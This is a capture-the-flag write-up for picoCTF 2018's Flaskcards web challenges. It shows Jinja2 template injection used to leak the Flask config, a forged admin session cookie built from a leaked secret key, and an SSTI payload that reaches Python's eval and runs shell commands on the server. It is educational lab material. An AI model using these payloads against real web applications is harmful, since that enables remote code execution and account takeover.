# Flaskcard Challenges

There are three challenges that are centered around a web app called Flaskcards. From the name, we can guess that they used Flask, a web framework in python. It is a simple app, register, login and you will see this:
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard1.png|alt=Flaskcard)
There is a link to admin, which sounds interesting, but that is not related to this challenge.

You can create cards:
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard2.png)
And they show up on the "List Cards" page.
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard3.png)


## Flaskcards
The challenge reads:
> We found this fishy [website](http://2018shell3.picoctf.com:17991/) for flashcards that we think may be sending secrets. Could you take a look?

Here we need to know that Flask implements a template engine to allow for dynamic webpages. The details are complicated, but the gist of it is that to show a variable to the end user, we add the tag
```
{{stuff}}
```
to put the variable stuff onto the webpage. If the developer is not careful, perhaps by not escaping the tag and directly displaying the user input, we may be able to use it to leak some information. To test if the page is vulnerable, we try injecting the input field with

![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard4.png)

And we get
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard5.png)

Jackpot! Flask saw our input and evaluated the expression. Now we just need something to leak. In Flask, we have a config variable that shows, well, configs. Lets try to look at config:
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard6.png)
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard7.png)

And we get the flag.

## Flaskcards Skeleton Key
> Nice! You found out they were sending the Secret_key: 73e1f2c96e364f0cc3371c31927ed156. Now, can you find a way to log in as admin? http://2018shell3.picoctf.com:12261 ([link](http://2018shell3.picoctf.com:12261)).

This time when we try to inject the web app, we found out that now it was safe: the inputs was properly escaped. Now it would be a good time to look at the admin page. When we click the admin page, we get this:
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard8.png)

The challenge gave us a secret key. What does that do? From the [Flask documentation](http://flask.pocoo.org/docs/1.0/quickstart/#sessions), it reads:
> In addition to the request object there is also a second object called session which allows you to store information specific to a user from one request to the next. This is implemented on top of cookies for you and signs the cookies cryptographically. What this means is that the user could look at the contents of your cookie but not modify it, unless they know the secret key used for signing.

But now we get the secret key! And from the website we have our session cookie
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard9.png)

Now we just need some tools to decrypt, possibly modify some entries and encrypt the cookie again. Here is a script with python:[https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe](https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe)
We changed the main to modify the cookie:
```
cookie = decodeFlaskCookie(key, session)
print(cookie)
cookie["user_id"] = 1
enc = encodeFlaskCookie(key, cookie)
print("New session:")
print(enc)
```
And we get our new cookie
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard10.png)
Plugging that in and we get our flag.
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard11.png)

## Flaskcards and Freedom
> There seem to be a few more files stored on the flash card server but we can't login. Can you? http://2018shell3.picoctf.com:56944 ([link](http://2018shell3.picoctf.com:56944))

The hint reads:
> There's more to the original vulnerability than meets the eye.
> Can you leverage the injection technique to get remote code execution?
It seems that we need to inject something to get RCE. Here we need to read online to find out that there we as bug in uber's website that used flask to allow RCE. [https://hackerone.com/reports/125980](https://hackerone.com/reports/125980)

Here we learned a payload ```"".__class__.mro()[1].__subclasses__()```. Trying to type that into the python interpreter and we get a list of classes! We could learn more in [https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2) and [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii). Lets try if the payload works:
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard12.png)

It does! From the two pages, it seems that subprocess.Popen may lead to a RCE. Lets try to access it with ```{{"".__class__.mro()[1].__subclasses__()[529]}}```
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard13.png)

It works! Lets try to ls:
```{{"".__class__.mro()[1].__subclasses__()[529](["ls","-la"])}}```
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard14.png)

No output! Looking at the documentation, it seems that for us to get the output from Popen, we need to stdout argument set to subprocess.PIPE, but we have no access to the subprocess module. Maybe we need to use some other methods to get RCE.

After some digging, I found a website [https://hk.saowen.com/a/e8beecab200bd27bdf03094819d06671f58781305985853744accce48df2b1cd](https://hk.saowen.com/a/e8beecab200bd27bdf03094819d06671f58781305985853744accce48df2b1cd) (in simplified Chinese) that had the solution. We are able to access some modules or global variables (sys in the case in the website) using ```"".__class__.mro()[1].__subclasses__()[??].__init__.__globals__```. One of the classes that can do that are \_frozen_importlib.\_DummyModuleLock. And we found ```__builtins__``` from it!
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard15.png)

From the python documentation, it reads:
> This module (builtins) provides direct access to all ‘built-in’ identifiers of Python; for example, builtins.open is the full name for the built-in function open().

Now we are set. We are able to call eval from python, and run arbitrary code in python. And with the payload ```__import__('os').popen('cat flag').read()```, the final payload looks like this:
```{{"".__class__.mro()[1].__subclasses__()[414].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")}}```
and we get our flag.
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/flaskcard16.png)
